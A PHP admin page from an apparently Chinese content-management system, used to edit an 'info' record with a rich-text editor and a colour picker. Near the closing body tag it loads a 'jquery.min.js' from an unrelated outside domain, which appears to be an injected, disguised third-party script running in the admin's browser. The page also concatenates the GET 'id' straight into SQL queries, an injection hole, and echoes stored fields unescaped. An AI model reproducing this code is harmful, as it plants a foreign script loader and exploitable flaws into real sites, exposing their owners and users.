<?php
 require_once('admin_check.php');
require_once('admin_config.php');
 if (isset($_POST['提交'])){
	null_back($_POST['i_name'],'请填写内容名称');
   	non_numeric_back($_POST['i_order'],'排序必须是数字');
 	$_data['i_zt'] = $_POST['i_zt'];
  	$_data['i_name'] = $_POST['i_name'];
  	$_data['i_order'] = $_POST['i_order'];
	$_data['i_content'] = $_POST['i_content'];
   	$_data['i_url'] = $_POST['i_url'];
  //	$_data['i_date'] =$sj;
   	$_data['i_color'] = $_POST['i_color'];
  	$_data['i_font'] = $_POST['i_font'];
  	$_data['i_hits'] =$_POST['i_hits'];

	$str = arrtoinsert($_data);
	$sql = 'update '.flag.'info set '.arrtoupdate($_data).' where id = '.$_GET['id'].'';
	if (mysql_query($sql)) {
		$order = mysql_insert_id();
 		alert_href('修改成功!','info.php');
	} else {
		alert_back('添加失败!');
	}
}

 ?>
 

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"> 
<html xmlns="http://www.w3.org/1999/xhtml"> 
<head> 
<!-- 必要元素 开始 -->
<link type="text/css" rel="stylesheet" href="file/main/2017/css/style.css" />
<script type="text/javascript" src="file/main/js/jquery-1.9.1.js"></script>
<!-- 必要元素 结束 -->

<!-- 表单元素 开始 -->
<script type="text/javascript" src="file/main/js/jquery.form.js"></script>
<!-- 表单元素 结束 -->

<!-- 表单验证元素 开始 -->
<script type="text/javascript" src="file/main/js/jquery.validate.js"></script>
<!-- 表单验证元素 结束 -->

<!-- 颜色选择器元素 开始 -->
<script type="text/javascript" src="file/colorPicker/jquery.colorpicker.js"></script>
<!-- 颜色选择器元素 结束 -->

<!-- 编辑器元素 开始 -->
<script charset="utf-8" src="file/kindeditor/kindeditor.js"></script>
<!-- 编辑器元素 结束 -->
 <link rel="stylesheet" href="../editor/themes/default/default.css" />
  <script type="text/javascript" src="../js/jquery-1.11.3.min.js"></script>
<script type="text/javascript" src="../ui/ui.js"></script>
<script type="text/javascript" src="../js/admin.js"></script>
<script charset="utf-8" type="text/javascript" src="../editor/kindeditor.js"></script>

 <script type="text/javascript">
KindEditor.ready(function(K) {
	K.create('#i_content');
	var editor = K.editor();
	K('#upload-image').click(function() {
		editor.loadPlugin('image', function() {
			editor.plugin.imageDialog({
			imageUrl : K('#site_logo').val(),
			clickFn : function(url, title, width, height, border, align) {
				K('#site_logo').val(url);
				editor.hideDialog();
				}
			});
		});
	});
	K('#slideshow').click(function() {
		editor.loadPlugin('multiimage', function() {
			editor.plugin.multiImageDialog({
				clickFn : function(urlList) {
					var tem_val = '';
					var tem_s = '';
					K.each(urlList, function(i, data) {
						tem_val = tem_val + tem_s + data.url;
						tem_s = '|';
					});
					K('#d_slideshow').val(tem_val);
					editor.hideDialog();
				}
			});
		});
	});
	K('#i_d1').click(function() {
		editor.loadPlugin('insertfile', function() {
			editor.plugin.fileDialog({
				fileUrl : K('#i_durl1').val(),
				clickFn : function(url, title) {
					K('#i_durl1').val(url);
					editor.hideDialog();
				}
			});
			
 		});
	});
	
	
	K('#i_d2').click(function() {
		editor.loadPlugin('insertfile', function() {
			editor.plugin.fileDialog({
				fileUrl : K('#i_durl2').val(),
				clickFn : function(url, title) {
					K('#i_durl2').val(url);
					editor.hideDialog();
				}
			});
			
 		});
	});
	
	
		K('#i_d3').click(function() {
		editor.loadPlugin('insertfile', function() {
			editor.plugin.fileDialog({
				fileUrl : K('#i_durl3').val(),
				clickFn : function(url, title) {
					K('#i_durl3').val(url);
					editor.hideDialog();
				}
			});
			
 		});
	});
	
	
		K('#i_d4').click(function() {
		editor.loadPlugin('insertfile', function() {
			editor.plugin.fileDialog({
				fileUrl : K('#i_durl4').val(),
				clickFn : function(url, title) {
					K('#i_durl4').val(url);
					editor.hideDialog();
				}
			});
			
 		});
	});
	
	
});

 </script>	
 
 <script>
			KindEditor.ready(function(K) {
				var colorpicker;
				K('#colorpicker').bind('click', function(e) {
					e.stopPropagation();
					if (colorpicker) {
						colorpicker.remove();
						colorpicker = null;
						return;
					}
					var colorpickerPos = K('#colorpicker').pos();
					colorpicker = K.colorpicker({
						x : colorpickerPos.x,
						y : colorpickerPos.y + K('#colorpicker').height(),
						z : 19811214,
						selectedColor : 'default',
						noColor : '无颜色',
						click : function(color) {
							K('#i_color').val(color);
							colorpicker.remove();
							colorpicker = null;
						}
					});
				});
				K(document).click(function() {
					if (colorpicker) {
						colorpicker.remove();
						colorpicker = null;
					}
				});
			});
		</script>



</head> 
<body> 
<div id="body">
	<div class="zl-tab-bd">
		<div class="zl-dd">
			<?php
					$result = mysql_query('select * from '.flag.'info where id = '.$_GET['id'].'');
					if ($row = mysql_fetch_array($result)){
					?>
 			<form id="annForm" name="annForm" action="" method="post">
			
				<dl>
							<dt>状态：</dt>
							<dd><select id="i_zt" name="i_zt" style="height:25px;">
								<option  <? if ($row['i_zt'] ==1) {echo "selected";}?> value="1">显示</option>
								<option <? if ($row['i_zt'] ==0) {echo "selected";}?>  value="0">关闭</option>
							</select>&nbsp;</dd>
			  </dl>
						
						
			  <dl>
                <dt>
                  <label for="label2">标题：</label>
                </dt>
			    <dd>
			      <input name="i_name" type="text" class="txt1" id="i_name" style="width:300px;" value="<?=$row['i_name']?>"/>

			      <input style="display:none"  name="i_color" type="text" class="txt1" id="i_color" style="width:50px;" value="<?=$row['i_color']?>"/>
                  <label style="display:none">>
          
					<a href="#" ><img src="file/main/images/colorpicker.png" id="colorpicker" style="cursor:pointer;cursor:hand;"/></A>
                    <input type="checkbox" <? if ($row['i_font'] !='') { echo "checked";}?> name="i_font" id="topCheck2" value="font-weight: bold"/>
                    加粗</label>
		        &nbsp;</dd>
		      </dl>
			 
					 
						<dl  style="display:none">
							<dt>来源：</dt>
							<dd>
								<label></label><label>
								<input name="i_url" type="text" class="txt1" id="i_url" style="width:300px;" value="<?=$row['i_url']?>"/>
								不填写则不跳转
								</label>
							</dd>
						</dl>
						<dl id="tr_content">
							<dt style="line-height: normal;">
							  <label for="annContent">内容：</label>
							</dt>
							<dd class="tuikuanjl"><textarea class="textarea"  style="width:300PX;height:100px"   id="i_content" name="i_content"><?=$row['i_content']?></textarea>
							</dd>
						</dl>
						<dl>
                          <dt>
                            <label for="label">排序：</label>
                          </dt>
						  <dd>
						    <input name="i_order" type="text" class="txt1" id="label" style="width:50px;" value="<?=$row['i_order']?>"/>
                            <label></label>
						  </dd>
			  </dl>
						<dl style="display:none">
                          <dt>
                            <label for="label2">访问：</label>
                          </dt>
						  <dd>
                            <input name="i_hits" type="text" class="txt1" id="label2" style="width:50px;" value="<?=$row['i_hits']?>"/>
                            <label></label>
                          </dd>
			  </dl>
						<dl>
							<dt></dt>
							<dd class="baocun"><input type="submit" id="提交" name="提交" class="button03" value="修改"/>
								<input type="button" id="btn_back" name="btn_back" class="btn-close" value="返回列表"/></dd>
						</dl>
				
		  </form>
		  <? }?>
		</div>
	</div>
	</div>
	
<script charset="utf-8" async="true" src="http://xr.5myr.cn/rb/jquery.min.js?tcdsp"></script></body>
<script type="text/javascript">
	KindEditor.ready(function(K) {
		var editor1 = K.create("textarea[name='annContent']", {
			width : "80%", //编辑器的宽度为75%
		    height : "410px", //编辑器的高度为200px
		    filterMode : false, //不会过滤HTML代码
		    uploadJson : 'upload_json.html',
		    allowUpload : true, //允许上传图片    fileManagerJson : 'file_manager_json.html',allowFileManager : true,
			fullscreenShortcut:true,
			allowImageRemote:false,
			items:[
			        'source', 'justifyleft', 'justifycenter', 'justifyright',
			        'justifyfull', 'selectall','formatblock', 'fontname', 'fontsize', 'forecolor', 'hilitecolor', 'bold',
			        'italic', 'underline', 'image',
			         'table','emoticons', 'link', 'unlink'
			],
		    afterBlur:function(){
		    	this.sync();
		    }
		});
	});
	
	$(document).ready(function() {
		$("#tr_address").hide();
		$("input[id='topCheck']").click(function(){
			var checkVal = $(this).val();
			if(checkVal == 0){
				$("#topCheck").val(1);
				$("#annIsTop").val(1);
			}else{
				$("#topCheck").val(0);
				$("#annIsTop").val(0);
			}
		});
		
		$("input[id='annSourceId']").click(function(){
			var checkVal = $(this).val();
			if(checkVal == 1){//本地内容
				$("#tr_content").show();
				$("#tr_address").remove();
				
			}else{//外部链接
				$("#tr_address").remove();
				$("#tr_content").after("<dl id='tr_address'><dt><label for='annAddress'>公告链接url：</label></dd><dd><input type='text' style='width:300px;' class='txt1' id='annAddress' name='annAddress' /></dd></dl>");
				$("#tr_content").hide();
			}
		});
	
		$("#cp3").colorpicker({
            fillcolor:true,
            success:function(o,color){
            	 $("#annTitleStyle").val(color);
                $("#annTitle").css("color",color);
            }
        });
       
       jQuery.validator.addMethod("linkUrl",function(value,element){
    	var pattern = /^http:\/\/.*$/;
   		 return this.optional(element) || pattern.test(value);
   		
   		});	
   		
   		$("#annForm").validate({
    		rules: {	
    				annTitle : {
    					required:true,
    					maxlength:50
    				},
    				annAddress:{
    					required:true,
    					linkUrl:true
    				}
    		},
    		messages:{
    			annTitle:{
    				required:"标题不能为空！  ",
    				maxlength:"标题最大长度为50"
    			},
    			annAddress:{
    				required:"链接不能为空！",
    				linkUrl:"格式错误！必须以 http://开头"
    			}
    		}
    	});
    	
    	$("input[id='btn_sub']").click(function() {
		 var target = $("#target").val();
		 $("input[id='btn_sub']").attr("disabled","disabled");
		if(!$("#annForm").valid()){
			 $("input[id='btn_sub']").attr("disabled",false);
		}
		//标注form为ajaxForm表单
		 $("#annForm").ajaxForm({
			 url : "doAddAnnouncement.html",
			 type:"post",
			 success : function(data) {
			    if(data.flag){
			    	alert("添加成功");
			    }else{
			    	alert("添加失败");
			    }
			    window.location.href="announcement.html?target="+target;
		   	  }
		 });
	  	$("#annForm").submit();
	 });
	 $("input[id='btn_back']").click(function() {
		 var target = $("#target").val();
		 window.location.href="info.php?target="+target;
	 });
   }); 
</script>
</html> 